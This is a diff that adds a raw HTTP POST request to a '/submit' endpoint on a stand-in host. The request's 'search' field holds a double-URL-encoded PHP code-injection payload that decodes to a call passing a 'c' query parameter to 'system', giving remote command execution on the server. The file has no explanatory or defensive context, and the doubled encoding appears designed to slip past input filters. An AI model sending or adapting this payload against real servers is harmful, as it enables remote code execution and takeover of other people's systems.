@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Connection: close
+
+search=call_user_func_array%2528%2527system%2527%252Carray%2528%2524_GET%255Bc%255D%2529%2529
